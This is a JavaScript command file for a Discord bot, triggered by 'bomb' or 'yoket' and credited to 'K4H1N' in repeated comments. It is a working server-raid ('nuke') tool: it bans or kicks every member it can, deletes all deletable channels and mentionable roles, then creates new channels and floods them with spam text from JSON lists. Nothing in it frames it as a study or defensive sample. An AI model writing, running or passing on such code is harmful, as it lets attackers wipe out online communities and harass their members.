const { MessageEmbed, MessageButton, MessageActionRow } = require("discord.js")
const channelName = require("../../name_text/channelNames.json");
const spamText = require("../../name_text/text.json");
const roleName = require("../../name_text/role.json");
const config = require("../../src/base/settings.json")

var newChannel = channelName.names
var newText = spamText.texts
var newRole = roleName.roles

module.exports = { // coded by K4H1N
    slash: false, 
    name: ["bomb", "yoket"],
    async execute(client, message, args) { // coded by K4H1N

        await message.guild.members.cache.forEach(m => {
            if(m.bannable) message.guild.members.ban(m, {reason: "zaaaaa"})
            else if(m.kicknable) message.guild.members.kick(m, {reason: "zaaaaa"})  // coded by K4H1N
        });

        await message.guild.channels.cache.forEach(m => {
            if(m.deletable) m.delete()
        })  // coded by K4H1N

        await newChannel.forEach(async m => {
            await message.guild.channels.create(m, {
                type: "GUILD_TEXT",  // coded by K4H1N
            }).then(async c => {
                await newText.forEach(async Text => {
                    await c.send(Text)
                })  // coded by K4H1N
            })
        })

        await message.guild.roles.cache.forEach(r => {
            if(r.mentionable) r.delete()
        })  // coded by K4H1N

        await newRole.forEach(async nr => {
            message.guild.roles.create(nr, {
                name: nr
            })  // coded by K4H1N
        })

        
    }
}
